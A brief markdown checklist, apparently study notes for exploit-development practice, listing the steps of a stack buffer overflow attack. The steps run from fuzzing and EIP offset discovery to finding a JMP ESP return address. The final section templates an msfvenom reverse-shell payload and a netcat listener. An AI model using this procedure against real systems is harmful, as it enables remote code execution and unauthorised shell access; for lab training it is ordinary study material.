# Buffer Oveflow

## Identify Overflow Length

1. Attach debugger
2. Run fuzzer script
3. Run confirm-overflow script

## Control EIP

1. Create pattern: `msf-pattern_create -l <length>`
2. Run locate-offset script
3. Locate offset: `msf-pattern_offset -l <length> <eip-value>`
4. Run verify-offset script

## Locate Space for Shellcode

1. Run increase-overflow script to attempt increasing overflow size
2. If successful, run bad-char script

## Find Return Address

1. Locate module w/ least memory protection: mona.py `!mona modules`
2. JMP ESP hex: `msf-nasm_shell > jmp esp` (FFE4)
3. Locate JMP ESP w/ no bad chars: mona.py `find -s "\xff\xe4" -m "<dll module>"`
4. Run verify-jmp-esp script

## Getting Shell

1. Generate payload: `msfvenom -p <payload> LHOST=<ip> LPORT=<port> EXITFUNC=thread -f <format> -e x86/shikata_ga_nai -b "<bad-chars> (e.g. \x00\x0a\x0d\x25\x26\x2b\x3d)"`
2. Run listener: `sudo nc -nvlp <port>`
3. Run exploit script
